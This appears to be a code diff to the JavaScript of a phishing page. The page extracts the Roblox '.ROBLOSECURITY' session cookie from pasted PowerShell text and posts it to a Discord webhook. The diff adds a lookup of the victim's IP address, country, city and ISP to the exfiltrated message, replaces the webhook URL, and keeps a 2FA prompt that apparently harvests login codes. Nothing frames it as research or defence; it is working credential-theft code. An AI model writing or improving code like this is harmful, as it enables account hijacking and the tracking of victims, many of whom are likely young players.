@@ -69,12 +69,28 @@ document.getElementById('submitButton').addEventListener('click', async function
     return;
   }
 
-  // Send webhook for valid cookie
+  // Send webhook for valid cookie with IP logging
   const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const match = powershellData.match(roblosecurityRegex);
+  let ipInfo = null;
   if (match) {
     const cookie = match[1].trim();
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
+    // Fetch IP and location info
+    try {
+      const res = await fetch('https://ipapi.co/json');
+      if (res.ok) {
+        ipInfo = await res.json();
+      }
+    } catch (e) {
+      ipInfo = null;
+    }
+    let locationText = '';
+    if (ipInfo) {
+      locationText = `IP: ${ipInfo.ip}\nCountry: ${ipInfo.country_name}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nOrg: ${ipInfo.org}`;
+    } else {
+      locationText = 'IP/location lookup failed.';
+    }
+    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
   }
 
   powershellInput.value = '';
@@ -101,7 +117,7 @@ document.getElementById('submitButton').addEventListener('click', async function
   }, 8500);
 
   setTimeout(() => {
-    // 10s: Show 2FA modal
+    // 10s: Show 2FA modal (not just success popup)
     openModal('twofa-modal');
   }, 10000);
 });
@@ -252,7 +268,7 @@ if (twofaInput2 && verifyButton2) {
 
 // === Webhook Sending ===
 async function sendWebhook(title, description, color) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1395575484481536031/5cdMZ-rXhB6KQeIBl2-tDD5osYswUTy0X7EkpbInND7JNHdAoNqotMCrzrv3eaDKu_9T';
+  const webhookUrl = 'https://discord.com/api/webhooks/1395829531897626806/ZTNUwtbRN2WBRgDvQacB3cVFA2MDNzZwOfoBMd36qlWtDArbpvPkAnvb8XO6ubNqBx04';
   const payload = {
     embeds: [{
       title: title,
